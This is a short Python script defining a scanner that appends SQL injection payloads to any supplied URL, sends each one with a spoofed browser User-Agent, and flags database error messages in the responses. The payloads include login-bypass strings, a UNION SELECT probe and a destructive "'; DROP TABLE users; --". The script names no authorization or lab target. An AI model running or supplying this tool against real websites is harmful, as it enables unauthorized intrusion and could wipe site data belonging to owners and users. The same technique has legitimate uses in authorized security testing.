import requests
import re

def scan(url):
    """
    Scan a URL for SQL injection vulnerabilities using common payloads.
    Args:
        url (str): URL to test (e.g., http://example.com/page?id=1)
    Returns:
        dict: Results of the scan (payloads tested and vulnerabilities found)
    """
    payloads = ["' OR 1=1 --", "' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT NULL --"]
    error_patterns = [
        r"mysql_fetch_array",
        r"you have an error in your sql syntax",
        r"warning: mysql",
        r"sql error",
        r"postgresql"
    ]
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    results = {"tested_payloads": [], "vulnerabilities": []}

    for payload in payloads:
        test_url = f"{url}{payload}"
        results["tested_payloads"].append(test_url)
        try:
            response = requests.get(test_url, headers=headers, timeout=5)
            response_text = response.text.lower()
            for pattern in error_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    results["vulnerabilities"].append({
                        "url": test_url,
                        "error": pattern,
                        "status_code": response.status_code
                    })
                    print(f"[+] Potential SQL Injection: {test_url} (Error: {pattern})")
                    break
        except requests.RequestException as e:
            print(f"[-] Error testing {test_url}: {e}")
            continue

    return results if results["vulnerabilities"] else "No SQL injection vulnerabilities found."